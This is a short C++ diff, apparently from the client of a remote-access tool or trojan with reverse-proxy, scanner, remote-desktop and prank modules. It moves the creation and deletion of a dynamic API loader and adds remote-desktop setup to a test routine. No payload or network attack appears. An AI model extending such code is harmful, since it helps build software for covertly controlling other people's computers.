@@ -91,7 +91,6 @@ void Cliente::DestroyClasses() {
     DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
     DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
     DeleteObj<mod_Escaner>(this->mod_Scan);
-    DeleteObj<DynamicLoad>(this->mod_dynamic);
     
     __DBG_("[DC] Clases destruidas");
 }
@@ -115,14 +114,22 @@ Cliente::Cliente() {
 }
 
 void Cliente::TEST() {
+    this->mod_dynamic->LoadFunProcs();
     this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
     this->mod_Fun->m_CD(TRUE);
     this->mod_Fun->m_Msg("1337 :v", "Testing", MB_ICONERROR);
+
+    this->mod_dynamic->LoadRDProcs();
+    this->mod_RemoteDesk = new mod_RemoteDesktop(this->mod_dynamic->USER32_RD, this->mod_dynamic->GDI32_RD, this->mod_dynamic->GDIPLUS_RD, this->mod_dynamic->OLE32);
+
+    this->DestroyClasses();
 }
 
 Cliente::~Cliente() {
 	this->CerrarConexion();
     this->DestroyClasses();
+    DeleteObj<DynamicLoad>(this->mod_dynamic);
+
 }
 
 void Cliente::CerrarConexion() {
@@ -1104,6 +1111,9 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
 
 //Loop principal
 void Cliente::MainLoop() {
+    if (!this->mod_dynamic) {
+        this->mod_dynamic = new DynamicLoad();
+    }
     this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
     std::this_thread::sleep_for(std::chrono::milliseconds(500));
     DWORD error_code = 0;
